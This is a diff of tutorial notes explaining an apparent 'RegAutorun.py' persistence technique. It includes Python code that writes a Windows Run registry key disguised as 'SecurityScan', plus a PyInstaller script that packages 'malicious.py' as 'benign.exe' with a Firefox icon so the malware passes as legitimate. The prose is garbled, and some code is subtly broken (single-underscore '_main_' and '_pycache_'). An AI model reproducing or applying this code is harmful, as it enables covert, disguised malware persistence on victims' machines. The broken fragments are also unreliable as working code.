@@ -1,3 +1,5 @@
+THis is explanation for RegAutorun.py file. There is another support file called Build.exe is there.
+
 Here we are going to use python to maintain persistence on a target system.
 
 In this , we are going to talk about autorun features in the window registry.
@@ -51,6 +53,11 @@ reghive = winreg.HKEY_CURRENT_USER
 # HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce
 # regpath = "SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce"
 
+
+HKCU and HKLM concept here: The above show the autorun key which enabled by default.
+
+Here we are going to setup python script, so that it easily solve one of four autorun keys.
+
 # reghive = winreg.HKEY_LOCAL_MACHINE
 # HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run
 regpath = "SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
@@ -60,3 +67,52 @@ regpath = "SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
 # add registry autorun key
 key = winreg.OpenKey(reghive,regpath,0,access=winreg.KEY_WRITE)
 winreg.SetValueEx(key,"SecurityScan",0,winreg.REG_SZ,filepath)
+
+In above, we are winreg package in python to interact with registry. So the first step in this process is to connect to regisry
+
+
+Second file:
+import PyInstaller._main_
+import shutil
+import os
+
+Here we are going to use PyInstaller to perform the conversion from python to executable. Note: pyinstaller can be run as a command line program or we can use it as embedded within a python script as shown here.  It is designed to create a self contained executable that can run on the windows system.
+As you all know, that with python script, you need python to be installed and its should run for the script that we going to use.
+With PyInstaller, we can wrapp all of our dependencies, requirement etc within a executable and this can run on system which dont even have python installed.
+
+Here we are using this in our exeample because we didnt have a particular malicious code or script etc. So we are going building one using pyinstaller. However if you have a particular piece of malware that you want to achieve persistence, you can skip this stage or process entirety.
+
+So what this particular python script does?
+
+Answer is below:
+
+filename = "malicious.py"
+exename = "benign.exe"
+icon = "Firefox.ico"
+pwd = os.getcwd()
+usbdir = os.path.join(pwd,"USB")
+
+
+The file called malicious.py creates an executable called benign.exe and we setting the icon for that executable to firefox icon
+
+
+
+if os.path.isfile(exename):
+  os.remove(exename)
+
+#create executable from python script
+PyInstaller._main_.run([
+  "malicious.py",
+  "--onefile",
+  "--clean",
+  "--log-level=ERROR",
+  "--name="+exename,
+  "--icon="+icon
+])
+
+#Clean up after Pyinstaller
+shutil.move(os.path.join(pwd,"dist",exename),pwd)
+shutil.rmtree("dist")
+shutil.rmtree("build")
+shutil.rmtree("_pycache_")
+os.remove(exename+".spec")
